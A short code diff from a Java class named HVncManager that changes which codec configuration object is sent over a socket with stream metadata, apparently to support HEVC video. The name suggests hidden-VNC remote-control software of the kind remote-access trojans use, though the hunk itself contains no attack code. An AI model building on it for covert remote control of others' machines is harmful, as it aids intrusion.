@@ -874,7 +874,7 @@ public final class HVncManager {
             // v4.0: include codec type so frontend knows whether to use avc1 or hev1
             meta.put(Protocol.KEY_CODEC, getActiveCodec());
             meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
-            Object[] args = new Object[] { meta, avcC };
+            Object[] args = new Object[] { meta, configBox };
             socket.emit(Protocol.HVNC, args);
             codecConfigSent = true;
         } catch (Exception e) {
